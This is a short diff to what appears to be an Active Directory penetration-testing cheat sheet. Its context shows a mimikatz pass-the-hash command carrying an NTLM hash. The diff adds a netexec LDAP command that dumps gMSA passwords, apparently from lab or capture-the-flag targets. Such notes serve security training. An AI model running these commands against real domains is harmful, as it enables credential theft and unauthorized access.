@@ -168,6 +168,9 @@ mimikatz(commandline) # privilege::debug
 
 mimikatz(commandline) # sekurlsa::pth /user:apache-dev$ /domain:inlanefreight.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe
 ```
+```bash
+netexec ldap DC.sendai.vl -u Thomas.Powell -p 0xdf0xdf.... --gmsa
+```
 
 ## Write DACL
 ### Enumeration
